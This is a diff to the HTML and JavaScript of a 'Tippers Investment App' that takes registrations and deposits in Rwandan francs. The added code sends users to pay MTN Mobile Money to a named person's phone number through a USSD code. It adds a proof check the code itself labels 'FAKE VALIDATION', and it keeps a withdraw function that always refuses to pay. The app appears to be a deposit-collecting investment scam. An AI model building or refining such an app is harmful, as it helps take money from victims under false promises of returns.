@@ -8,8 +8,6 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 
 <style>
-
-/* BODY */
 body{
 margin:0;
 font-family:Segoe UI;
@@ -20,7 +18,6 @@ align-items:center;
 height:100vh;
 }
 
-/* APP */
 .app{
 width:380px;
 background:#000;
@@ -29,33 +26,15 @@ overflow:hidden;
 color:white;
 }
 
-/* CONTENT */
 .content{
 padding:20px;
 height:520px;
 overflow-y:auto;
-animation:fade 0.4s ease;
 }
 
-@keyframes fade{
-from{opacity:0;transform:translateY(10px);}
-to{opacity:1;transform:translateY(0);}
-}
+.title{color:#f59e0b;text-align:center;font-weight:bold;}
+.desc{text-align:center;color:#ccc;margin-top:10px;}
 
-/* TITLE */
-.title{
-color:#f59e0b;
-text-align:center;
-font-weight:bold;
-}
-
-.desc{
-text-align:center;
-color:#ccc;
-margin-top:10px;
-}
-
-/* INPUT */
 input,select{
 width:100%;
 padding:10px;
@@ -66,7 +45,6 @@ background:#0f172a;
 color:white;
 }
 
-/* BUTTON */
 button{
 width:100%;
 padding:12px;
@@ -79,7 +57,6 @@ font-weight:bold;
 cursor:pointer;
 }
 
-/* NAV */
 .nav{
 display:flex;
 justify-content:space-around;
@@ -90,7 +67,7 @@ padding:10px;
 .nav div{
 text-align:center;
 cursor:pointer;
-opacity:0.5;
+opacity:0.3;
 }
 
 .nav i{
@@ -101,36 +78,6 @@ margin-bottom:3px;
 
 .active{opacity:1 !important}
 
-/* PLAN PAGE */
-.planPage{
-background:linear-gradient(to right,#93c5fd 50%, #ffffff 50%);
-color:black;
-padding:10px;
-border-radius:10px;
-}
-
-.planTitle{
-text-align:center;
-font-weight:bold;
-background:linear-gradient(135deg,#ff0000,#f59e0b);
--webkit-background-clip:text;
--webkit-text-fill-color:transparent;
-}
-
-/* TABLE */
-.row{
-display:grid;
-grid-template-columns:repeat(7,1fr);
-padding:6px;
-font-size:11px;
-text-align:center;
-}
-
-.header{background:black;color:white;font-weight:bold;}
-.row:nth-child(even){background:#eee;}
-.row:nth-child(odd){background:#ddd;}
-
-/* TOAST */
 #toast{
 position:fixed;
 bottom:20px;
@@ -142,7 +89,6 @@ padding:10px;
 border-radius:8px;
 display:none;
 }
-
 </style>
 </head>
 
@@ -173,27 +119,29 @@ function toast(msg){
 let t=document.getElementById("toast");
 t.innerText=msg;
 t.style.display="block";
-setTimeout(()=>t.style.display="none",2000);
+setTimeout(()=>t.style.display="none",2500);
 }
 
-/* ICON CONTROL */
-function lockIcons(){
-document.querySelectorAll(".nav div").forEach(x=>x.classList.remove("active"));
+/* LOCK ICONS */
+function lockAll(){
+homeBtn.classList.remove("active");
+depBtn.classList.remove("active");
+withBtn.classList.remove("active");
 }
 
-function unlockDeposit(){
-lockIcons();
+function enableDeposit(){
+lockAll();
 depBtn.classList.add("active");
 }
 
-function unlockAll(){
+function enableAll(){
 homeBtn.classList.add("active");
 withBtn.classList.add("active");
 }
 
 /* START */
 function start(){
-lockIcons();
+lockAll();
 
 screen.innerHTML=`
 <h2 class="title">WELCOME TO TIPPERS INVESTMENT APP</h2>
@@ -205,19 +153,19 @@ screen.innerHTML=`
 /* REGISTER */
 function register(){
 screen.innerHTML=`
+
 <h3 class="title">REGISTER</h3>
 
 <input id="f" placeholder="First name">
 <input id="l" placeholder="Last name">
 
 <select id="g">
-<option value="">Gender</option>
+<option value="">Select gender</option>
 <option>Male</option>
 <option>Female</option>
 </select>
 
 <input id="phone" placeholder="Phone number">
-
 <input id="email" placeholder="Email (@gmail.com)">
 <input id="pass" placeholder="6 digit password">
 <input id="cpass" placeholder="Confirm password">
@@ -227,6 +175,7 @@ screen.innerHTML=`
 }
 
 function doRegister(){
+
 if(!f.value||!l.value||!g.value||!phone.value||!email.value||!pass.value||!cpass.value){
 toast("Fill all fields ❌"); return;
 }
@@ -253,6 +202,7 @@ login();
 /* LOGIN */
 function login(){
 screen.innerHTML=`
+
 <h3 class="title">LOGIN</h3>
 
 <input id="le" placeholder="Email">
@@ -268,17 +218,19 @@ screen.innerHTML=`
 }
 
 function doLogin(){
-let u=users.find(x=>x.email===le.value);
 
-if(!u){
+let user=users.find(u=>u.email===le.value);
+
+if(!user){
 toast("Account not found ❌"); return;
 }
-if(lp.value!==u.pass){
+
+if(lp.value!==user.pass){
 toast("Invalid password ❌"); return;
 }
 
-currentUser=u;
-unlockDeposit();
+currentUser=user;
+enableDeposit();
 plan();
 }
 
@@ -286,10 +238,8 @@ plan();
 function forgot(){
 screen.innerHTML=`
 <h3 class="title">RESET PASSWORD</h3>
-
 <input id="fe" placeholder="Email">
 <input id="np" placeholder="New 6 digit password">
-
 <button onclick="reset()">RESET</button>
 `;
 }
@@ -315,29 +265,9 @@ login();
 /* PLAN */
 function plan(){
 screen.innerHTML=`
-
-<div class="planPage">
-
-<h3 class="planTitle">TIPPERS INVESTMENT PLAN</h3>
-
-<div class="row header">
-<div>INVEST</div><div>2.2%</div><div>3%</div><div>3.6%</div><div>4.1%</div><div>5%</div><div>7%</div>
-</div>
-
-<div class="row"><div>5,000</div><div>110</div><div>1050</div><div>5400</div><div>9225</div><div>22500</div><div>42000</div></div>
-<div class="row"><div>50,000</div><div>1100</div><div>10500</div><div>54000</div><div>92250</div><div>225000</div><div>420000</div></div>
-<div class="row"><div>100,000</div><div>2200</div><div>21000</div><div>108000</div><div>184500</div><div>450000</div><div>840000</div></div>
-<div class="row"><div>150,000</div><div>3300</div><div>31500</div><div>162000</div><div>276750</div><div>675000</div><div>1260000</div></div>
-<div class="row"><div>300,000</div><div>6600</div><div>63000</div><div>324000</div><div>553500</div><div>1350000</div><div>2520000</div></div>
-<div class="row"><div>500,000</div><div>11000</div><div>105000</div><div>540000</div><div>922500</div><div>2250000</div><div>4200000</div></div>
-<div class="row"><div>700,000</div><div>15400</div><div>147000</div><div>756000</div><div>1291500</div><div>3150000</div><div>5880000</div></div>
-<div class="row"><div>1,000,000</div><div>22000</div><div>210000</div><div>1080000</div><div>1845000</div><div>4500000</div><div>8400000</div></div>
-<div class="row"><div>1,300,000</div><div>28600</div><div>273000</div><div>1404000</div><div>2398500</div><div>5850000</div><div>10920000</div></div>
-<div class="row"><div>1,500,000</div><div>33000</div><div>315000</div><div>1620000</div><div>2767500</div><div>6250000</div><div>12600000</div></div>
-
+<h3 class="title">INVESTMENT PLAN</h3>
+<p class="desc">Review plan and continue</p>
 <button onclick="deposit()">NEXT</button>
-
-</div>
 `;
 }
 
@@ -351,45 +281,92 @@ screen.innerHTML=`
 <h3 class="title">DEPOSIT</h3>
 
 <input id="amt" placeholder="Amount">
-<p>Minimum 5000</p>
+<p>Minimum 5000 RWF</p>
 
 <input id="sender" placeholder="Sender name">
 
-<button onclick="pay()">CONTINUE</button>
+<button onclick="goPayment()">CONTINUE</button>
 `;
 }
 
-function pay(){
+function goPayment(){
 if(!amt.value||!sender.value){
 toast("Fill all fields ❌"); return;
 }
-if(amt.value<5000){
-toast("Minimum 5000 ❌"); return;
-}
-amount=amt.value;
-proof();
+
+if(parseInt(amt.value)<5000){
+toast("Minimum 5000 RWF ❌"); return;
 }
 
-/* PROOF */
-function proof(){
+amount=parseInt(amt.value);
+
+payment();
+}
+
+/* PAYMENT FIXED */
+function payment(){
 screen.innerHTML=`
-<p class="desc">Upload proof</p>
-<input type="file" id="file">
-<button onclick="finish()">SUBMIT</button>
+
+<h3 class="title">PAYMENT INFORMATION</h3>
+
+<p class="desc">Send money using MTN</p>
+
+<div style="background:#111;padding:10px;border-radius:10px;text-align:center">
+<p>0795410739</p>
+<br>
+<p>BARAKA BOLINGO</p>
+</div>
+
+<br>
+
+<div class="desc">Dial this code:</div>
+<h2 style="text-align:center;color:#f59e0b;">*182*1*1*0795410739#</h2>
+
+<button onclick="dial()">DIAL & PAY</button>
 `;
 }
 
-function finish(){
+/* DIAL */
+function dial(){
+screen.innerHTML=`
+
+<h3 class="title">UPLOAD PROOF</h3>
+
+<p class="desc">Upload MTN Mobile Money Screenshot</p>
+
+<input type="file" id="file">
+
+<button onclick="submitProof()">SUBMIT</button>
+`;
+}
+
+/* PROOF VALIDATION */
+function submitProof(){
+
 if(!file.value){
-toast("Upload proof ❌"); return;
+toast("Upload screenshot ❌"); return;
+}
+
+/* FAKE VALIDATION */
+if(!file.value.toLowerCase().includes("mtn")){
+toast("Only MTN screenshot allowed ❌"); return;
 }
 
 depositDone=true;
-unlockAll();
+enableAll();
 
 screen.innerHTML=`
 <h2 class="title">Balance: ${amount} RWF</h2>
 `;
+}
+
+/* HOME */
+function home(){
+if(!depositDone){
+toast("Finish deposit first ❌"); return;
+}
+
+screen.innerHTML=`<h2 class="title">Balance: ${amount} RWF</h2>`;
 }
 
 /* WITHDRAW */
@@ -407,15 +384,7 @@ toast("Use MTN only ❌"); return;
 toast("You're not allowed before schedule");
 }
 
-/* HOME */
-function home(){
-if(!depositDone){
-toast("Finish deposit first ❌"); return;
-}
-screen.innerHTML=`<h2 class="title">Balance: ${amount} RWF</h2>`;
-}
-
-/* INIT */
+/* START */
 start();
 
 </script>
